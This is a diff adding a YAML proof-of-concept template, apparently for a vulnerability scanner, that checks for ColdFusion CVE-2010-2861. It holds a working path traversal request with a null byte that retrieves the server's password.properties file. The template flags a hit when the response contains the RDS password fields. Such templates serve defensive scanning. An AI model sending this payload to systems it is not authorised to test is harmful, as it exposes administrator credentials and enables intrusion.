@@ -1,0 +1,18 @@
+detail:
+  author: sharecast
+  links:
+  - https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861
+  version: 8.0, 8.0.1, 9.0, 9.0.1 and earlier versions
+expression: r0()
+manual: true
+name: poc-yaml-coldfusion-cve-2010-2861-lfi
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"rdspassword=")
+      && response.body.bcontains(b"encrypted=")
+    request:
+      cache: true
+      follow_redirects: true
+      method: GET
+      path: /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en
+transport: http
